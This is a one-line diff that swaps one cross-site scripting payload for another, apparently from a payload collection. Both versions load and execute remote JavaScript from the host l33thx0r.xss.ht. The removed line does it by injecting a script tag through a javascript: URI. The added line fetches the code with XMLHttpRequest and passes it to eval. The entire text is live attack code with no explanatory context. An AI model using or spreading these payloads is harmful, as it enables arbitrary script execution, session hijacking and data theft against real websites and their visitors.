@@ -1,1 +1,1 @@
-javascript:eval('var a=document.createElement(\'script\');a.src=\'https://l33thx0r.xss.ht\';document.body.appendChild(a)')
+function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//l33thx0r.xss.ht");a.send();
